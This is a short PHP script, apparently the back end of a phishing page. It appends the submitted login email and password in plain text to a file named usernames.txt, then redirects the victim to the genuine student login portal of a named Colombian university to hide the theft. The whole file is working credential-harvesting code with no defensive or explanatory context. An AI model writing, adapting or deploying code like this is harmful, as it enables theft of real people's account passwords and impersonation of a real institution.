<?php

file_put_contents("usernames.txt", " Username: " . $_POST['login_email'] . " Pass: " . $_POST['login_password'] . "\n", FILE_APPEND);
header('Location: https://sigaacademico.unisabana.edu.co/psp/CS90PRO/?&cmd=login&languageCd=ESP/');
exit();
?>